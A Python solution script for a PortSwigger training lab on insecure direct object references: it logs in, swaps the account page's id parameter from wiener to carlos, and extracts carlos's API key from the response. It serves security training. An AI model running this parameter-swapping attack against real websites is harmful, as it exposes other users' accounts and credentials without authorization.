# Lab 07 — User ID controlled by request parameter
# PortSwigger: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
#
# Vulnerability: Account page reads a user ID straight from a URL parameter,
#                with no check that the logged-in session actually owns that ID
# Aim:           Find and submit carlos's API key
#
# Technique:
#   The canonical IDOR. /my-account?id=wiener works fine for your own session.
#   Simply changing id=wiener to id=carlos returns carlos's account page,
#   including his API key — the server never verifies ownership of the id.
#
# Usage: python access_control_lab07.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status, extract_between, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 07 — USER ID CONTROLLED BY REQUEST PARAMETER (IDOR)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab07.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm your own account page works normally ────────────────
    print("\n  ── Step 1: load your own account page (id=wiener)\n")
    r_own = session.get(f"{url}/my-account", params={"id": "wiener"})
    check_status(r_own, 200, "Own account access")

    # ── Step 2: swap the id parameter to carlos ──────────────────────────────
    print("\n  ── Step 2: swap id parameter to carlos\n")
    r_carlos = session.get(f"{url}/my-account", params={"id": "carlos"})
    check_status(r_carlos, 200, "carlos's account access via IDOR")

    # ── Step 3: extract carlos's API key from the response ───────────────────
    api_key = extract_between(r_carlos.text, "API Key: <span>", "</span>") or \
              extract_between(r_carlos.text, 'id="api-key">', "</")

    if api_key:
        print_box("LEAKED API KEY (carlos)", api_key)
    else:
        print("\n  ?  Could not auto-extract the API key — inspect the response")
        print("     manually for the exact HTML structure around it.")
        print_box("Raw response snippet", r_carlos.text[:500])

    print("  ℹ  Submit this API key as the lab solution.")
